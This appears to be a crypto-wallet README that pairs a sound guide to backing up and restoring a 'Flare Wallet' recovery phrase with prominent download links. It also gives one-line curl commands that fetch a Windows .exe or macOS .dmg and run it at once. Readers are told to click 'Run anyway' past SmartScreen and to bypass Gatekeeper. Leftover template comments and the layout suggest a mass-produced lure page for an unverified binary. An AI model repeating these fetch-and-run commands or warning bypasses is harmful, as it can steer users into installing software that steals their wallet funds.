![Flare Wallet](assets/banner-article.png)

# Flare Wallet Backup and Restore: Seed Phrase, Keystore and Key

Your backup is a restore test, not a piece of paper you file and forget.

## Downloads - v1.3.02

<p align="center"><a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe"><img src="assets/download-windows.svg" alt="Download Windows"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg"><img src="assets/download-macos.svg" alt="Download macOS"></a> <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip"><img src="assets/download-linux.svg" alt="Download Linux"></a></p>

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.svg" alt="platform Windows"> | Windows 10 (1909) or later, 64-bit | [`flare-wallet-desktop-windows-v1.3.02.exe`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe) |
| <img src="assets/platform-macos.svg" alt="platform macOS"> | macOS 12 or later | [`flare-wallet-desktop-macos-v1.3.02.dmg`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg) |
| <img src="assets/platform-linux.svg" alt="platform Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`flare-wallet-desktop-linux-v1.3.02.zip`](https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip) |

Restoring on a new machine starts with the [current Flare Wallet release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02), because the phrase needs an application to read it. Back up before you replace a build, not after.

> The application is replaceable. The phrase is not. If you have the phrase, a lost laptop costs you an hour; if you do not, it costs you the funds.

In Flare Wallet, the backup is the recovery phrase and the application is disposable. The wallet also accepts a keystore file and a private key, so there are three ways in, and each one is a different kind of backup with a different risk. What never changes is the rule: the phrase stays offline, and no website or support channel ever needs it.

<!-- ARTICLE-BODY-BEGIN -->

## What a backup actually is here

It is the material that lets another installation rebuild your address. For most readers that is the recovery phrase: a sequence of words generated when the wallet is created, from which the keys are derived. Reinstall the application anywhere, choose the restore path, type the words, and the same address appears.

A keystore file and a private key are the other two routes the wallet exposes. They are not interchangeable in practice. A keystore file is typically encrypted with a password you choose, which means the file without the password is useless and the password without the file is useless. A private key is unencrypted control of one address: anyone who sees it has the funds, with no second factor.

## The three access paths and what each is for

| Path | What you keep | What it costs you if exposed |
| --- | --- | --- |
| Recovery phrase | The words, offline | Every address derived from it |
| Keystore file | The file plus its password | The address it holds, if the password is weak |
| Private key | A string of characters | The address it controls, immediately |

The phrase is the broadest and the most dangerous. The other two are narrower, which makes them useful for a specific wallet you want to isolate, and less useful as your only plan.

## Write it down, then prove it works

1. Create the wallet on a machine you trust, with no one watching the screen.
2. Write the words on paper, in order, and check each one against the screen before you dismiss it.
3. Store the paper somewhere that is not the same bag as the laptop.
4. Before funding anything, restore the wallet from that paper on the same machine or a second one.
5. Confirm the restored address matches the original exactly, character for character.
6. Only then send funds to it.

Step four is the one people skip. A transcription error is invisible until the day you need it, and that day is the worst possible time to discover you wrote "desert" instead of "dessert". Restoring while the wallet is empty turns a catastrophic mistake into a two-minute correction.

## What never to do with it

Do not photograph the phrase, do not store it in a password manager, do not email it to yourself, do not type it into a website that offers to check it, and do not read it out to anyone who calls. No legitimate support process needs it, because no legitimate support process can do anything with your account that you cannot do yourself.

The scenario to recognise: someone contacts you, claims your wallet needs verification or migration, and asks for the words. That is the entire attack. The patterns are catalogued in <a href="https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-scam.md">Flare Wallet scam</a>.

## Restoring on a new computer

Install the wallet from the release page first, then choose the restore path at setup rather than creating a new wallet. Enter the phrase or import the keystore file, and confirm the address that appears matches the one you expect before you do anything else.

If the restored wallet shows an empty portfolio, check the network before you panic: chain ID 14 for Flare mainnet. A restore onto the wrong chain looks exactly like a failed restore. The fields are in <a href="https://github.com/flarewallet/flare-wallet-staking/blob/HEAD/flare-wallet-network-settings.md">Flare Wallet network settings</a>.

## Passphrases and the wallet that appears empty

Some wallets offer an optional passphrase, an extra secret combined with the phrase to derive a different wallet. This build does not: its recovery is the phrase alone, with no 25th word at creation or restore. The consequence for your backup is simple, and worth stating rather than leaving to be discovered: nothing else is needed to restore, and nothing else can stand between a found phrase and the funds. <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-passphrase.md">Flare Wallet passphrase</a> covers what the missing feature would have changed.

## FAQ

### Is a screenshot of my phrase a backup?

No. A screenshot syncs to cloud storage, appears in photo libraries and survives in caches. It is one of the most common ways a phrase leaks.

### Can I recover the wallet without the phrase?

Not without one of the other two paths the wallet exposes: a keystore file with its password, or a private key. If you have none of the three, there is no recovery, by design and by definition. Reinstall from the <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02">current Flare Wallet release</a> only when you have one of them in hand.

### What happens if I lose my computer?

Nothing to the funds, as long as you have the phrase or another access path. Install the wallet on a new machine, restore, and the same address appears with the same balance.

### Should I back up before updating?

Yes. Back up and test the restore before you replace a build, so a failed update costs you time rather than access. The update path itself is in <a href="https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-update.md">keep Flare Wallet updated</a>.

### Is there a login I can reset?

No. There is no account and no server, so there is no password reset and no support override. The phrase is the only credential that matters.

### Can I keep the phrase in two places?

Yes, and for larger holdings it is sensible to keep two copies in two locations that fail independently, for example one at home and one in a safe deposit box. Two copies in the same bag is one copy.

<!-- ARTICLE-BODY-END -->

## How to install Flare Wallet

<!-- INSTALL-BEGIN: keep only OS subsections whose file exists in the release (D11). -->

### Windows

Quick install (CMD):

```cmd
curl -fLo setup.exe https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe && setup.exe
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-windows-v1.3.02.exe">flare-wallet-desktop-windows-v1.3.02.exe</a>.
2. Open the downloaded file.
3. If SmartScreen appears, choose More info, then Run anyway.
4. Finish the setup steps.

### macOS

Quick install (Terminal):

```bash
curl -fLo setup.dmg https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg && open setup.dmg
```

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-macos-v1.3.02.dmg">flare-wallet-desktop-macos-v1.3.02.dmg</a>.
2. Open the .dmg file.
3. Drag the app to Applications.
4. On first launch, right-click the app and choose Open.

### Linux

The Linux asset is a ZIP archive; verify the hash, extract it, then run the executable inside.

Manual install:
1. Download <a href="https://github.com/flarewallet/flare-desktop-wallet/releases/latest/download/flare-wallet-desktop-linux-v1.3.02.zip">flare-wallet-desktop-linux-v1.3.02.zip</a>.
2. Verify it before extracting: `sha256sum flare-wallet-desktop-linux-v1.3.02.zip`.
3. Extract with your file manager or `unzip flare-wallet-desktop-linux-v1.3.02.zip`.
4. Make the extracted executable runnable if needed, then launch it.
<!-- INSTALL-END -->

## Related guides

[Flare Wallet login](https://github.com/flarewallet/flare-wallet-guide/blob/HEAD/flare-wallet-login.md) | [is Flare Wallet safe](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/is-flare-wallet-safe.md) | [Flare Wallet scam](https://github.com/flarewallet/flare-wallet-security/blob/HEAD/flare-wallet-scam.md) | [current release](https://github.com/flarewallet/flare-desktop-wallet/releases/tag/v1.3.02)
